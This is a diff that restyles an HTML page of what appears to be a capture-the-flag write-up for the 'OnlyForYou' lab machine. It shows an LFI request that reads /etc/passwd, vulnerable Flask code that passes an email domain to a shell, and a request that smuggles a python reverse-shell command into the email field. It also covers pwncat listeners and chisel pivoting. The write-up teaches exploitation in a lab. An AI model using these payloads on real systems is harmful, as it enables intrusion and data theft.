-    <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'405.html'</span>), <span style="color: #ffd400; font-weight: bold;">405</span>
+<span style="font-weight: bold; text-decoration: underline;">@app.errorhandler</span>(405)
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">method_not_allowed</span>(error):
+    <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'405.html'</span>), 405
 
-<span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #1ea8fc;">__name__</span> == <span style="color: #7984D1;">'__main__'</span>:
-    app.run(host=<span style="color: #7984D1;">'127.0.0.1'</span>, port=<span style="color: #ffd400; font-weight: bold;">80</span>, debug=<span style="color: #df85ff; font-weight: bold;">False</span>)
+<span style="font-weight: bold;">if</span> <span style="font-weight: bold;">__name__</span> == <span style="font-style: italic;">'__main__'</span>:
+    app.run(host=<span style="font-style: italic;">'127.0.0.1'</span>, port=80, debug=<span style="font-weight: bold; text-decoration: underline;">False</span>)
 </pre>
 </div>
 
 <p>
-There is an LFI on the &ldquo;download&rdquo; route
+There is an LFI on the "download" route
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python"><span style="color: #ffd400;">@app.route</span>(<span style="color: #7984D1;">'/download'</span>, methods=[<span style="color: #7984D1;">'POST'</span>])
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">download</span>():
-    image = request.form[<span style="color: #7984D1;">'image'</span>]
+<pre class="src src-python"><span style="font-weight: bold; text-decoration: underline;">@app.route</span>(<span style="font-style: italic;">'/download'</span>, methods=[<span style="font-style: italic;">'POST'</span>])
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">download</span>():
+    image = request.form[<span style="font-style: italic;">'image'</span>]
     filename = posixpath.normpath(image)
-    <span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #7984D1;">'..'</span> <span style="color: #ff2afc; font-weight: bold;">in</span> filename <span style="color: #ff2afc; font-weight: bold;">or</span> filename.startswith(<span style="color: #7984D1;">'../'</span>):
-        flash(<span style="color: #7984D1;">'Hacking detected!'</span>, <span style="color: #7984D1;">'danger'</span>)
-        <span style="color: #ff2afc; font-weight: bold;">return</span> redirect(<span style="color: #7984D1;">'/list'</span>)
-    <span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #ff2afc; font-weight: bold;">not</span> os.path.isabs(filename):
-        filename = os.path.join(app.config[<span style="color: #7984D1;">'LIST_FOLDER'</span>], filename)
-    <span style="color: #ff2afc; font-weight: bold;">try</span>:
-        <span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #ff2afc; font-weight: bold;">not</span> os.path.isfile(filename):
-            flash(<span style="color: #7984D1;">'Image doesn\'t exist!'</span>, <span style="color: #7984D1;">'danger'</span>)
-            <span style="color: #ff2afc; font-weight: bold;">return</span> redirect(<span style="color: #7984D1;">'/list'</span>)
-    <span style="color: #ff2afc; font-weight: bold;">except</span> (<span style="color: #ffd400;">TypeError</span>, <span style="color: #ffd400;">ValueError</span>):
-        <span style="color: #ff2afc; font-weight: bold;">raise</span> BadRequest()
-    <span style="color: #ff2afc; font-weight: bold;">return</span> send_file(filename, as_attachment=<span style="color: #df85ff; font-weight: bold;">True</span>)
+    <span style="font-weight: bold;">if</span> <span style="font-style: italic;">'..'</span> <span style="font-weight: bold;">in</span> filename <span style="font-weight: bold;">or</span> filename.startswith(<span style="font-style: italic;">'../'</span>):
+        flash(<span style="font-style: italic;">'Hacking detected!'</span>, <span style="font-style: italic;">'danger'</span>)
+        <span style="font-weight: bold;">return</span> redirect(<span style="font-style: italic;">'/list'</span>)
+    <span style="font-weight: bold;">if</span> <span style="font-weight: bold;">not</span> os.path.isabs(filename):
+        filename = os.path.join(app.config[<span style="font-style: italic;">'LIST_FOLDER'</span>], filename)
+    <span style="font-weight: bold;">try</span>:
+        <span style="font-weight: bold;">if</span> <span style="font-weight: bold;">not</span> os.path.isfile(filename):
+            flash(<span style="font-style: italic;">'Image doesn\'t exist!'</span>, <span style="font-style: italic;">'danger'</span>)
+            <span style="font-weight: bold;">return</span> redirect(<span style="font-style: italic;">'/list'</span>)
+    <span style="font-weight: bold;">except</span> (<span style="font-weight: bold; text-decoration: underline;">TypeError</span>, <span style="font-weight: bold; text-decoration: underline;">ValueError</span>):
+        <span style="font-weight: bold;">raise</span> BadRequest()
+    <span style="font-weight: bold;">return</span> send_file(filename, as_attachment=<span style="font-weight: bold; text-decoration: underline;">True</span>)
 </pre>
 </div>
 
@@ -393,9 +393,9 @@ This means that any attempt to use a relative path with <code>..</code> or <code
 </p>
 </div>
 </div>
-<div id="outline-container-org4095108" class="outline-4">
-<h4 id="org4095108">LFI and Foothold</h4>
-<div class="outline-text-4" id="text-org4095108">
+<div id="outline-container-org42e1e4e" class="outline-4">
+<h4 id="org42e1e4e">LFI and Foothold</h4>
+<div class="outline-text-4" id="text-org42e1e4e">
 <p>
 So in order to abuse the LFI you simply need to send a POST req to the /download endpoint with a image argument in the body
 </p>
@@ -404,7 +404,7 @@ So in order to abuse the LFI you simply need to send a POST req to the /download
 Here is an example request
 </p>
 
-<pre class="example" id="org510aa10">
+<pre class="example" id="org3342f3b">
 POST http://beta.only4you.htb/download HTTP/1.1
 Host: beta.only4you.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
@@ -428,7 +428,7 @@ image=/etc/passwd
 <p>
 Here is /etc/passwd
 </p>
-<pre class="example" id="org3e7e5dc">
+<pre class="example" id="org2ff81a9">
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -482,7 +482,7 @@ Lets try and find the config for the web applications.
 The default config is at <code>/etc/nginx/sites-enabled/default</code>
 Here is the config
 </p>
-<pre class="example" id="org2d1a710">
+<pre class="example" id="org343bbce">
 server {
     listen 80;
     return 301 http://only4you.htb$request_uri;
@@ -523,50 +523,50 @@ We can assume the main website is also a flask app lets try to get the main <cod
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python"><span style="color: #ff2afc; font-weight: bold;">from</span> flask <span style="color: #ff2afc; font-weight: bold;">import</span> Flask, render_template, request, flash, redirect
-<span style="color: #ff2afc; font-weight: bold;">from</span> form <span style="color: #ff2afc; font-weight: bold;">import</span> sendmessage
-<span style="color: #ff2afc; font-weight: bold;">import</span> uuid
+<pre class="src src-python"><span style="font-weight: bold;">from</span> flask <span style="font-weight: bold;">import</span> Flask, render_template, request, flash, redirect
+<span style="font-weight: bold;">from</span> form <span style="font-weight: bold;">import</span> sendmessage
+<span style="font-weight: bold;">import</span> uuid
 
-<span style="color: #df85ff;">app</span> = Flask(<span style="color: #1ea8fc;">__name__</span>)
-app.<span style="color: #df85ff;">secret_key</span> = uuid.uuid4().<span style="color: #1ea8fc;">hex</span>
+<span style="font-weight: bold; font-style: italic;">app</span> = Flask(<span style="font-weight: bold;">__name__</span>)
+app.<span style="font-weight: bold; font-style: italic;">secret_key</span> = uuid.uuid4().<span style="font-weight: bold;">hex</span>
 
-<span style="color: #ffd400;">@app.route</span>(<span style="color: #7984D1;">'/'</span>, methods=[<span style="color: #7984D1;">'GET'</span>, <span style="color: #7984D1;">'POST'</span>])
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">index</span>():
-    <span style="color: #ff2afc; font-weight: bold;">if</span> request.method == <span style="color: #7984D1;">'POST'</span>:
-        email = request.form[<span style="color: #7984D1;">'email'</span>]
-        subject = request.form[<span style="color: #7984D1;">'subject'</span>]
-        message = request.form[<span style="color: #7984D1;">'message'</span>]
+<span style="font-weight: bold; text-decoration: underline;">@app.route</span>(<span style="font-style: italic;">'/'</span>, methods=[<span style="font-style: italic;">'GET'</span>, <span style="font-style: italic;">'POST'</span>])
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">index</span>():
+    <span style="font-weight: bold;">if</span> request.method == <span style="font-style: italic;">'POST'</span>:
+        email = request.form[<span style="font-style: italic;">'email'</span>]
+        subject = request.form[<span style="font-style: italic;">'subject'</span>]
+        message = request.form[<span style="font-style: italic;">'message'</span>]
         ip = request.remote_addr
 
         status = sendmessage(email, subject, message, ip)
-        <span style="color: #ff2afc; font-weight: bold;">if</span> status == <span style="color: #ffd400; font-weight: bold;">0</span>:
-            flash(<span style="color: #7984D1;">'Something went wrong!'</span>, <span style="color: #7984D1;">'danger'</span>)
-        <span style="color: #ff2afc; font-weight: bold;">elif</span> status == <span style="color: #ffd400; font-weight: bold;">1</span>:
-            flash(<span style="color: #7984D1;">'You are not authorized!'</span>, <span style="color: #7984D1;">'danger'</span>)
-        <span style="color: #ff2afc; font-weight: bold;">else</span>:
-            flash(<span style="color: #7984D1;">'Your message was successfuly sent! We will reply as soon as possible.'</span>, <span style="color: #7984D1;">'success'</span>)
-        <span style="color: #ff2afc; font-weight: bold;">return</span> redirect(<span style="color: #7984D1;">'/#contact'</span>)
-    <span style="color: #ff2afc; font-weight: bold;">else</span>:
-        <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'index.html'</span>)
+        <span style="font-weight: bold;">if</span> status == 0:
+            flash(<span style="font-style: italic;">'Something went wrong!'</span>, <span style="font-style: italic;">'danger'</span>)
+        <span style="font-weight: bold;">elif</span> status == 1:
+            flash(<span style="font-style: italic;">'You are not authorized!'</span>, <span style="font-style: italic;">'danger'</span>)
+        <span style="font-weight: bold;">else</span>:
+            flash(<span style="font-style: italic;">'Your message was successfuly sent! We will reply as soon as possible.'</span>, <span style="font-style: italic;">'success'</span>)
+        <span style="font-weight: bold;">return</span> redirect(<span style="font-style: italic;">'/#contact'</span>)
+    <span style="font-weight: bold;">else</span>:
+        <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'index.html'</span>)
 
-<span style="color: #ffd400;">@app.errorhandler</span>(<span style="color: #ffd400; font-weight: bold;">404</span>)
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">page_not_found</span>(error):
-    <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'404.html'</span>), <span style="color: #ffd400; font-weight: bold;">404</span>
+<span style="font-weight: bold; text-decoration: underline;">@app.errorhandler</span>(404)
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">page_not_found</span>(error):
+    <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'404.html'</span>), 404
 
-<span style="color: #ffd400;">@app.errorhandler</span>(<span style="color: #ffd400; font-weight: bold;">500</span>)
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">server_errorerror</span>(error):
-    <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'500.html'</span>), <span style="color: #ffd400; font-weight: bold;">500</span>
+<span style="font-weight: bold; text-decoration: underline;">@app.errorhandler</span>(500)
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">server_errorerror</span>(error):
+    <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'500.html'</span>), 500
 
-<span style="color: #ffd400;">@app.errorhandler</span>(<span style="color: #ffd400; font-weight: bold;">400</span>)
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">bad_request</span>(error):
-    <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'400.html'</span>), <span style="color: #ffd400; font-weight: bold;">400</span>
+<span style="font-weight: bold; text-decoration: underline;">@app.errorhandler</span>(400)
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">bad_request</span>(error):
+    <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'400.html'</span>), 400
 
-<span style="color: #ffd400;">@app.errorhandler</span>(<span style="color: #ffd400; font-weight: bold;">405</span>)
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">method_not_allowed</span>(error):
-    <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'405.html'</span>), <span style="color: #ffd400; font-weight: bold;">405</span>
+<span style="font-weight: bold; text-decoration: underline;">@app.errorhandler</span>(405)
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">method_not_allowed</span>(error):
+    <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'405.html'</span>), 405
 
-<span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #1ea8fc;">__name__</span> == <span style="color: #7984D1;">'__main__'</span>:
-    app.run(host=<span style="color: #7984D1;">'127.0.0.1'</span>, port=<span style="color: #ffd400; font-weight: bold;">80</span>, debug=<span style="color: #df85ff; font-weight: bold;">False</span>)
+<span style="font-weight: bold;">if</span> <span style="font-weight: bold;">__name__</span> == <span style="font-style: italic;">'__main__'</span>:
+    app.run(host=<span style="font-style: italic;">'127.0.0.1'</span>, port=80, debug=<span style="font-weight: bold; text-decoration: underline;">False</span>)
 </pre>
 </div>
 
@@ -581,77 +581,77 @@ And the source for <code>form.py</code>
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python"><span style="color: #ff2afc; font-weight: bold;">import</span> smtplib, re
-<span style="color: #ff2afc; font-weight: bold;">from</span> email.message <span style="color: #ff2afc; font-weight: bold;">import</span> EmailMessage
-<span style="color: #ff2afc; font-weight: bold;">from</span> subprocess <span style="color: #ff2afc; font-weight: bold;">import</span> PIPE, run
-<span style="color: #ff2afc; font-weight: bold;">import</span> ipaddress
+<pre class="src src-python"><span style="font-weight: bold;">import</span> smtplib, re
+<span style="font-weight: bold;">from</span> email.message <span style="font-weight: bold;">import</span> EmailMessage
+<span style="font-weight: bold;">from</span> subprocess <span style="font-weight: bold;">import</span> PIPE, run
+<span style="font-weight: bold;">import</span> ipaddress
 
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">issecure</span>(email, ip):
-    <span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #ff2afc; font-weight: bold;">not</span> re.match(<span style="color: #7984D1;">"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})"</span>, email):
-        <span style="color: #ff2afc; font-weight: bold;">return</span> <span style="color: #ffd400; font-weight: bold;">0</span>
-    <span style="color: #ff2afc; font-weight: bold;">else</span>:
-        domain = email.split(<span style="color: #7984D1;">"@"</span>, <span style="color: #ffd400; font-weight: bold;">1</span>)[<span style="color: #ffd400; font-weight: bold;">1</span>]
-        <span style="color: #df85ff;">result</span> = run([f<span style="color: #7984D1;">"dig txt </span>{domain}<span style="color: #7984D1;">"</span>], shell=<span style="color: #df85ff; font-weight: bold;">True</span>, stdout=PIPE)
-        output = result.stdout.decode(<span style="color: #7984D1;">'utf-8'</span>)
-        <span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #7984D1;">"v=spf1"</span> <span style="color: #ff2afc; font-weight: bold;">not</span> <span style="color: #ff2afc; font-weight: bold;">in</span> output:
-            <span style="color: #ff2afc; font-weight: bold;">return</span> <span style="color: #ffd400; font-weight: bold;">1</span>
-        <span style="color: #ff2afc; font-weight: bold;">else</span>:
-            domains = []
-            ips = []
-            <span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #7984D1;">"include:"</span> <span style="color: #ff2afc; font-weight: bold;">in</span> output:
-                dms = <span style="color: #7984D1;">''</span>.join(re.findall(r<span style="color: #7984D1;">"include:.*\.[A-Z|a-z]{2,}"</span>, output)).split(<span style="color: #7984D1;">"include:"</span>)
-                dms.pop(<span style="color: #ffd400; font-weight: bold;">0</span>)
-                <span style="color: #ff2afc; font-weight: bold;">for</span> domain <span style="color: #ff2afc; font-weight: bold;">in</span> dms:
-                    domains.append(domain)
-                <span style="color: #ff2afc; font-weight: bold;">while</span> <span style="color: #df85ff; font-weight: bold;">True</span>:
-                    <span style="color: #ff2afc; font-weight: bold;">for</span> domain <span style="color: #ff2afc; font-weight: bold;">in</span> domains:
-                        result = run([f<span style="color: #7984D1;">"dig txt </span>{domain}<span style="color: #7984D1;">"</span>], shell=<span style="color: #df85ff; font-weight: bold;">True</span>, stdout=PIPE)
-                        output = result.stdout.decode(<span style="color: #7984D1;">'utf-8'</span>)
-                        <span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #7984D1;">"include:"</span> <span style="color: #ff2afc; font-weight: bold;">in</span> output:
-                            dms = <span style="color: #7984D1;">''</span>.join(re.findall(r<span style="color: #7984D1;">"include:.*\.[A-Z|a-z]{2,}"</span>, output)).split(<span style="color: #7984D1;">"include:"</span>)
-                            domains.clear()
-                            <span style="color: #ff2afc; font-weight: bold;">for</span> domain <span style="color: #ff2afc; font-weight: bold;">in</span> dms:
-                                domains.append(domain)
-                        <span style="color: #ff2afc; font-weight: bold;">elif</span> <span style="color: #7984D1;">"ip4:"</span> <span style="color: #ff2afc; font-weight: bold;">in</span> output:
-                            ipaddresses = <span style="color: #7984D1;">''</span>.join(re.findall(r<span style="color: #7984D1;">"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}"</span>, output)).split(<span style="color: #7984D1;">"ip4:"</span>)
-                            ipaddresses.pop(<span style="color: #ffd400; font-weight: bold;">0</span>)
-                            <span style="color: #ff2afc; font-weight: bold;">for</span> i <span style="color: #ff2afc; font-weight: bold;">in</span> ipaddresses:
-                                ips.append(i)
-                        <span style="color: #ff2afc; font-weight: bold;">else</span>:
-                            <span style="color: #ff2afc; font-weight: bold;">pass</span>
-                    <span style="color: #ff2afc; font-weight: bold;">break</span>
-            <span style="color: #ff2afc; font-weight: bold;">elif</span> <span style="color: #7984D1;">"ip4"</span> <span style="color: #ff2afc; font-weight: bold;">in</span> output:
-                ipaddresses = <span style="color: #7984D1;">''</span>.join(re.findall(r<span style="color: #7984D1;">"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}"</span>, output)).split(<span style="color: #7984D1;">"ip4:"</span>)
-                ipaddresses.pop(<span style="color: #ffd400; font-weight: bold;">0</span>)
-                <span style="color: #ff2afc; font-weight: bold;">for</span> i <span style="color: #ff2afc; font-weight: bold;">in</span> ipaddresses:
-                    ips.append(i)
-            <span style="color: #ff2afc; font-weight: bold;">else</span>:
-                <span style="color: #ff2afc; font-weight: bold;">return</span> <span style="color: #ffd400; font-weight: bold;">1</span>
-        <span style="color: #ff2afc; font-weight: bold;">for</span> i <span style="color: #ff2afc; font-weight: bold;">in</span> ips:
-            <span style="color: #ff2afc; font-weight: bold;">if</span> ip == i:
-                <span style="color: #ff2afc; font-weight: bold;">return</span> <span style="color: #ffd400; font-weight: bold;">2</span>
-            <span style="color: #ff2afc; font-weight: bold;">elif</span> ipaddress.ip_address(ip) <span style="color: #ff2afc; font-weight: bold;">in</span> ipaddress.ip_network(i):
-                <span style="color: #ff2afc; font-weight: bold;">return</span> <span style="color: #ffd400; font-weight: bold;">2</span>
-            <span style="color: #ff2afc; font-weight: bold;">else</span>:
-                <span style="color: #ff2afc; font-weight: bold;">return</span> <span style="color: #ffd400; font-weight: bold;">1</span>
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">issecure</span>(email, ip):
+    <span style="font-weight: bold;">if</span> <span style="font-weight: bold;">not</span> re.match(<span style="font-style: italic;">"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})"</span>, email):
+                <span style="font-weight: bold;">return</span> 0
+        <span style="font-weight: bold;">else</span>:
+                domain = email.split(<span style="font-style: italic;">"@"</span>, 1)[1]
+                <span style="font-weight: bold; font-style: italic;">result</span> = run([f<span style="font-style: italic;">"dig txt </span>{domain}<span style="font-style: italic;">"</span>], shell=<span style="font-weight: bold; text-decoration: underline;">True</span>, stdout=PIPE)
+                output = result.stdout.decode(<span style="font-style: italic;">'utf-8'</span>)
+                <span style="font-weight: bold;">if</span> <span style="font-style: italic;">"v=spf1"</span> <span style="font-weight: bold;">not</span> <span style="font-weight: bold;">in</span> output:
+                        <span style="font-weight: bold;">return</span> 1
+                <span style="font-weight: bold;">else</span>:
+                        domains = []
+                        ips = []
+                        <span style="font-weight: bold;">if</span> <span style="font-style: italic;">"include:"</span> <span style="font-weight: bold;">in</span> output:
+                                dms = <span style="font-style: italic;">''</span>.join(re.findall(r<span style="font-style: italic;">"include:.*\.[A-Z|a-z]{2,}"</span>, output)).split(<span style="font-style: italic;">"include:"</span>)
+                                dms.pop(0)
+                                <span style="font-weight: bold;">for</span> domain <span style="font-weight: bold;">in</span> dms:
+                                        domains.append(domain)
+                                <span style="font-weight: bold;">while</span> <span style="font-weight: bold; text-decoration: underline;">True</span>:
+                                        <span style="font-weight: bold;">for</span> domain <span style="font-weight: bold;">in</span> domains:
+                                                result = run([f<span style="font-style: italic;">"dig txt </span>{domain}<span style="font-style: italic;">"</span>], shell=<span style="font-weight: bold; text-decoration: underline;">True</span>, stdout=PIPE)
+                                                output = result.stdout.decode(<span style="font-style: italic;">'utf-8'</span>)
+                                                <span style="font-weight: bold;">if</span> <span style="font-style: italic;">"include:"</span> <span style="font-weight: bold;">in</span> output:
+                                                        dms = <span style="font-style: italic;">''</span>.join(re.findall(r<span style="font-style: italic;">"include:.*\.[A-Z|a-z]{2,}"</span>, output)).split(<span style="font-style: italic;">"include:"</span>)
+                                                        domains.clear()
+                                                        <span style="font-weight: bold;">for</span> domain <span style="font-weight: bold;">in</span> dms:
+                                                                domains.append(domain)
+                                                <span style="font-weight: bold;">elif</span> <span style="font-style: italic;">"ip4:"</span> <span style="font-weight: bold;">in</span> output:
+                                                        ipaddresses = <span style="font-style: italic;">''</span>.join(re.findall(r<span style="font-style: italic;">"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}"</span>, output)).split(<span style="font-style: italic;">"ip4:"</span>)
+                                                        ipaddresses.pop(0)
+                                                        <span style="font-weight: bold;">for</span> i <span style="font-weight: bold;">in</span> ipaddresses:
+                                                                ips.append(i)
+                                                <span style="font-weight: bold;">else</span>:
+                                                        <span style="font-weight: bold;">pass</span>
+                                        <span style="font-weight: bold;">break</span>
+                        <span style="font-weight: bold;">elif</span> <span style="font-style: italic;">"ip4"</span> <span style="font-weight: bold;">in</span> output:
+                                ipaddresses = <span style="font-style: italic;">''</span>.join(re.findall(r<span style="font-style: italic;">"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}"</span>, output)).split(<span style="font-style: italic;">"ip4:"</span>)
+                                ipaddresses.pop(0)
+                                <span style="font-weight: bold;">for</span> i <span style="font-weight: bold;">in</span> ipaddresses:
+                                        ips.append(i)
+                        <span style="font-weight: bold;">else</span>:
+                                <span style="font-weight: bold;">return</span> 1
+                <span style="font-weight: bold;">for</span> i <span style="font-weight: bold;">in</span> ips:
+                        <span style="font-weight: bold;">if</span> ip == i:
+                                <span style="font-weight: bold;">return</span> 2
+                        <span style="font-weight: bold;">elif</span> ipaddress.ip_address(ip) <span style="font-weight: bold;">in</span> ipaddress.ip_network(i):
+                                <span style="font-weight: bold;">return</span> 2
+                        <span style="font-weight: bold;">else</span>:
+                                <span style="font-weight: bold;">return</span> 1
 
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">sendmessage</span>(email, subject, message, ip):
-    status = issecure(email, ip)
-    <span style="color: #ff2afc; font-weight: bold;">if</span> status == <span style="color: #ffd400; font-weight: bold;">2</span>:
-        msg = EmailMessage()
-        msg[<span style="color: #7984D1;">'From'</span>] = f<span style="color: #7984D1;">'</span>{email}<span style="color: #7984D1;">'</span>
-        msg[<span style="color: #7984D1;">'To'</span>] = <span style="color: #7984D1;">'info@only4you.htb'</span>
-        msg[<span style="color: #7984D1;">'Subject'</span>] = f<span style="color: #7984D1;">'</span>{subject}<span style="color: #7984D1;">'</span>
-        msg[<span style="color: #7984D1;">'Message'</span>] = f<span style="color: #7984D1;">'</span>{message}<span style="color: #7984D1;">'</span>
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">sendmessage</span>(email, subject, message, ip):
+        status = issecure(email, ip)
+        <span style="font-weight: bold;">if</span> status == 2:
+                msg = EmailMessage()
+                msg[<span style="font-style: italic;">'From'</span>] = f<span style="font-style: italic;">'</span>{email}<span style="font-style: italic;">'</span>
+                msg[<span style="font-style: italic;">'To'</span>] = <span style="font-style: italic;">'info@only4you.htb'</span>
+                msg[<span style="font-style: italic;">'Subject'</span>] = f<span style="font-style: italic;">'</span>{subject}<span style="font-style: italic;">'</span>
+                msg[<span style="font-style: italic;">'Message'</span>] = f<span style="font-style: italic;">'</span>{message}<span style="font-style: italic;">'</span>
 
-        smtp = smtplib.SMTP(host=<span style="color: #7984D1;">'localhost'</span>, port=<span style="color: #ffd400; font-weight: bold;">25</span>)
-        smtp.send_message(msg)
-        smtp.<span style="color: #df85ff; font-weight: bold;">quit</span>()
-        <span style="color: #ff2afc; font-weight: bold;">return</span> status
-    <span style="color: #ff2afc; font-weight: bold;">elif</span> status == <span style="color: #ffd400; font-weight: bold;">1</span>:
-        <span style="color: #ff2afc; font-weight: bold;">return</span> status
-    <span style="color: #ff2afc; font-weight: bold;">else</span>:
-        <span style="color: #ff2afc; font-weight: bold;">return</span> status
+                smtp = smtplib.SMTP(host=<span style="font-style: italic;">'localhost'</span>, port=25)
+                smtp.send_message(msg)
+                smtp.<span style="font-weight: bold; text-decoration: underline;">quit</span>()
+                <span style="font-weight: bold;">return</span> status
+        <span style="font-weight: bold;">elif</span> status == 1:
+                <span style="font-weight: bold;">return</span> status
+        <span style="font-weight: bold;">else</span>:
+                <span style="font-weight: bold;">return</span> status
 
 </pre>
 </div>
@@ -673,7 +673,7 @@ Start up pwncat or ncat
 <p>
 Here is the request with the injection
 </p>
-<pre class="example" id="org7a6910e">
+<pre class="example" id="orga13f109">
 POST http://only4you.htb/ HTTP/1.1
 Host: only4you.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
@@ -698,22 +698,22 @@ name=lololol%40gmail.com&amp;email=lol@gmail.com; python3 -c 'import socket,subp
 </div>
 
 
-<div id="outline-container-orgfb8b4b0" class="outline-3">
-<h3 id="orgfb8b4b0">Foothold enumeration</h3>
-<div class="outline-text-3" id="text-orgfb8b4b0">
+<div id="outline-container-org8187cdc" class="outline-3">
+<h3 id="org8187cdc">Foothold enumeration</h3>
+<div class="outline-text-3" id="text-org8187cdc">
 <p>
-Now that I have a foothold, it&rsquo;s time to enumerate with LinPEAS.
+Now that I have a foothold, it's time to enumerate with LinPEAS.
 </p>
 
 <p>
-I&rsquo;ll leave the exercise of uploading a tool to the target host as an exercise for the reader.<sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup>  Once I got LinPEAS.sh onto the host, I started with some basic enumeration.
+I'll leave the exercise of uploading a tool to the target host as an exercise for the reader.<sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup>  Once I got LinPEAS.sh onto the host, I started with some basic enumeration.
 </p>
 
 <p>
 The following is a great example of why you should always run <code>netstat</code>:
 </p>
 
-<pre class="example" id="org6933e66">
+<pre class="example" id="orge19b4f0">
 tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -
 tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
 tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
@@ -727,15 +727,15 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 </pre>
 
 <p>
-We can see the two ports 80 and 22 from our nmap, but we can also see that MySQL and other services are running. We will need to &ldquo;pivot&rdquo; by running a proxy on the remote host.
+We can see the two ports 80 and 22 from our nmap, but we can also see that MySQL and other services are running. We will need to "pivot" by running a proxy on the remote host.
 </p>
 </div>
 
-<div id="outline-container-orga2d6ab9" class="outline-4">
-<h4 id="orga2d6ab9">Inspecting the ports</h4>
-<div class="outline-text-4" id="text-orga2d6ab9">
+<div id="outline-container-orgcfadde6" class="outline-4">
+<h4 id="orgcfadde6">Inspecting the ports</h4>
+<div class="outline-text-4" id="text-orgcfadde6">
 <p>
-But how do we access it? We use a proxy on the victim host to &ldquo;pivot&rdquo; to the port we need.
+But how do we access it? We use a proxy on the victim host to "pivot" to the port we need.
 </p>
 
 <p>
@@ -744,8 +744,8 @@ I use chisel since that is what was recommended to me.<sup><a id="fnr.5" class="
 </div>
 
 <ul class="org-ul">
-<li><a id="org3e14b85"></a>Neo4j ports<br />
-<div class="outline-text-5" id="text-org3e14b85">
+<li><a id="orgc7e2f14"></a>Neo4j ports<br />
+<div class="outline-text-5" id="text-orgc7e2f14">
 <p>
 By looking up some of the ports, we find that it is neo4j (you might already know that from the passwd file).
 This table is from the Documentation for neo4j.<sup><a id="fnr.6" class="footref" href="#fn.6" role="doc-backlink">6</a></sup>
@@ -845,8 +845,8 @@ This table is from the Documentation for neo4j.<sup><a id="fnr.6" class="footref
 </div>
 </li>
 
-<li><a id="org01791a2"></a>GOG&rsquo;s<br />
-<div class="outline-text-5" id="text-org01791a2">
+<li><a id="orgfa92392"></a>GOG's<br />
+<div class="outline-text-5" id="text-orgfa92392">
 <p>
 Gogs and Gitea listen on port 3000. There is nothing interesting about that yet.
 </p>
@@ -855,9 +855,9 @@ Gogs and Gitea listen on port 3000. There is nothing interesting about that yet.
 </ul>
 </div>
 </div>
-<div id="outline-container-org2197e57" class="outline-3">
-<h3 id="org2197e57">onlyforyou</h3>
-<div class="outline-text-3" id="text-org2197e57">
+<div id="outline-container-org847394d" class="outline-3">
+<h3 id="org847394d">onlyforyou</h3>
+<div class="outline-text-3" id="text-org847394d">
 <p>
